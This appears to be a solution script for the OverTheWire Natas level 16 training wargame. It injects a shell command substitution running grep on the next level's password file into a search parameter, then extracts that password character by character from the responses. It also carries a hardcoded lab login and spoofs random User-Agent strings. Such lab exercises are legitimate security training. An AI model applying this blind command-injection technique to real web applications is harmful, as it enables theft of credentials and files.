#!/usr/bin/python3.9

"""This script is a solution to Overthewire Natas level 16."""

import string
import requests as r
from requests.auth import HTTPBasicAuth
from fake_useragent import UserAgent

url = "http://natas16.natas.labs.overthewire.org/"

lvl_user = "natas16"
lvl_pass = "TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V"

headers = {
    "User-Agent": UserAgent().random
    }

try:
    retrieved=""
    for _ in range(32):
        for c in list(string.ascii_letters+string.digits):
            res = r.get(
                url,
                params={"needle": f"$(grep ^{retrieved+c} /etc/natas_webpass/natas17)Africans"},
                headers=headers, 
                auth=HTTPBasicAuth(lvl_user, lvl_pass))

            if res.text.split("\n")[-8] != "Africans":
                retrieved+=c
                print("[RETRIEVED]", retrieved)
                break
        
    print("[PASSWORD]", retrieved)

except Exception as e:
    print("[ERROR]", e, "\n")
    exit(-1)
